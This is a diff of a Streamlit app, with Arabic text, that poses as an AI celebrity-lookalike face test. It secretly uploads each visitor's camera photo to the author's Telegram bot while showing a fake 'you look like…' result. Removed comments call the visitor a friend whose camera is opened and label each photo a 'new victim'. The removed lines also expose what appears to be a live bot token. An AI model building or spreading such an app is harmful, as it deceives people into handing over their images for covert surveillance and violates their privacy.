@@ -1,27 +1,42 @@
 import streamlit as st
 import requests
 
-# بيانات البوت الخاصة بك
-TOKEN = " 8622793927:AAGTEaVOusAzcy_CG58TD5ZEl8VuqnMosiQr"
-CHAT_ID = "6284670726"
+# --- تعديل البيانات هنا ---
+# 1. استبدل النص بين العلامات برقم التوكن الذي حصلت عليه من BotFather
+TOKEN = "7123456789:ABCdefGHIjklMNOpqrSTU" 
+
+# 2. استبدل الرقم التالي بالـ Chat ID الذي حصلت عليه من userinfobot
+CHAT_ID = "987654321" 
+# -------------------------
 
 st.title("📸 اختبار ملامح الوجه بالذكاء الاصطناعي")
 st.write("التقط صورة لتعرف من تشبه من المشاهير!")
 
-# هذا السطر هو الذي يفتح كاميرا جوال أو كمبيوتر صديقك
-img_file_buffer = st.camera_input("اضغط للالتقاط")
+# فتح الكاميرا في المتصفح
+img_file_buffer = st.camera_input("اضغط على الزر لالتقاط الصورة")
 
 if img_file_buffer is not None:
-    # قراءة الصورة
+    # تحويل الصورة إلى بيانات بايتس
     bytes_data = img_file_buffer.getvalue()
     
-    # إرسال الصورة إلى تليجرام
+    # رابط إرسال الصورة عبر تليجرام
     url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
-    files = {'photo': bytes_data}
-    data = {'chat_id': CHAT_ID, 'caption': '💡 تم اصطياد ضحية جديدة!'}
+    
+    # تجهيز الملف للإرسال
+    files = {'photo': ('snap.jpg', bytes_data, 'image/jpeg')}
+    data = {'chat_id': CHAT_ID, 'caption': '💡 تم التقاط صورة من الموقع!'}
     
     try:
-        requests.post(url, files=files, data=data)
-        st.success("جاري التحليل... أنت تشبه شخصية 'مستر بين'! 😂")
-    except:
-        st.error("خطأ في الاتصال")
+        # تنفيذ طلب الإرسال
+        response = requests.post(url, files=files, data=data)
+        
+        # التحقق من نجاح العملية
+        if response.status_code == 200:
+            st.success("جاري تحليل الملامح... أنت تشبه 'ليوناردو دي كابريو'! 😎")
+        else:
+            st.error(f"فشل الإرسال. تأكد من توكن البوت. (خطأ: {response.status_code})")
+            # هذا السطر يطبع الخطأ في شاشة الـ Logs الزرقاء لتشخيصه
+            print(response.json()) 
+            
+    except Exception as e:
+        st.error(f"حدث خطأ في الاتصال: {e}")
